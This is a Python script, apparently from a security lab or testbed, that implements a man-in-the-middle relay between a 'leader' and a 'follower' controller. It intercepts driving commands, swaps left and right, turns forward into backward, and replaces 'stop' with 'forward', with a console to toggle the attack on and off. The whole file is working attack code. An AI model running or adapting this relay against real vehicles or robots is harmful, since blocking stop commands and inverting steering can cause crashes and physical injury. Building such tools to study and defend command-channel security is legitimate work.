import socket
import threading
import time

# Global variables for attack toggle
toggle_lock = threading.Lock()
attack_enabled = True  # Starts enabled

def manipulate_direction(key):
    """
    Manipulate only the direction command sent from leader to follower.
    Speed remains unchanged.
    """
    # Example 1: Reverse directions
    if key == 'a':
        return 'd'  # Change left to right
    elif key == 'd':
        return 'a'  # Change right to left
    
    # Example 2: Delay certain commands (forward becomes backwards)
    if key == 'w':
        return 's'  # Replace forward with backward
    
    # Example 3: Block stopping
    if key == 'f':
        return 'w'  # Replace stop with forward
    
    # Default: Pass through unchanged
    return key

def handle_leader_to_follower(leader_conn, follower_conn):
    try:
        while True:
            data = leader_conn.recv(1024)
            if not data:
                print("Leader disconnected")
                break
            
            original = data.decode('utf-8')
            print(f"Original data: {original}")
            
            # Check attack state thread-safely
            with toggle_lock:
                enabled = attack_enabled
            
            if enabled:
                try:
                    speed, key = original.split(',')
                    new_key = manipulate_direction(key)
                    modified = f"{speed},{new_key}"
                    print(f"Modified data: {original} -> {modified}")
                    follower_conn.sendall(modified.encode('utf-8'))
                except Exception as e:
                    print(f"Error processing data: {e}")
                    follower_conn.sendall(data)
            else:
                print(f"Passing through: {original}")
                follower_conn.sendall(data)
    except Exception as e:
        print(f"Leader-to-follower error: {e}")
    finally:
        leader_conn.close()
        follower_conn.close()


def toggle_attack():
    global attack_enabled
    with toggle_lock:
        attack_enabled = not attack_enabled
        status = "ENABLED" if attack_enabled else "DISABLED"
        print(f"\n[!] Attack mode {status}")

def handle_commands():
    print("\n=== ATTACK CONTROL ===")
    print("Type 'toggle' to enable/disable attack")
    print("Type 'status' to show current mode")
    print("Type 'exit' to terminate")
    
    while True:
        cmd = input("Command> ").strip().lower()
        if cmd == 'toggle':
            toggle_attack()
        elif cmd == 'status':
            with toggle_lock:
                st = "ENABLED" if attack_enabled else "DISABLED"
            print(f"Attack is currently {st}")
        elif cmd == 'exit':
            print("Exiting control interface...")
            break
        else:
            print("Unknown command. Use 'toggle', 'status', or 'exit'.")


def start_relay():
    # Leader socket
    leader_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    leader_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    leader_server.bind(('0.0.0.0', 12345))
    leader_server.listen(1)
    print("Relay waiting for leader connection on port 12345...")
    leader_conn, leader_addr = leader_server.accept()
    print(f"Leader connected from {leader_addr}")

    # Follower socket
    follower_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    follower_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    follower_server.bind(('0.0.0.0', 12346))
    follower_server.listen(1)
    print("Relay waiting for follower connection on port 12346...")
    follower_conn, follower_addr = follower_server.accept()
    print(f"Follower connected from {follower_addr}")

    print("\n=== RELAY ACTIVE ===")
    print("Attack manipulation is initially ENABLED")

    # Start the command interface in its own thread
    threading.Thread(target=handle_commands, daemon=True).start()

    # Start the relay/mitm thread
    threading.Thread(
        target=handle_leader_to_follower,
        args=(leader_conn, follower_conn),
        daemon=True
    ).start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nShutting down relay and control interface...")
    finally:
        leader_conn.close()
        follower_conn.close()
        leader_server.close()
        follower_server.close()

if __name__ == '__main__':
    start_relay()
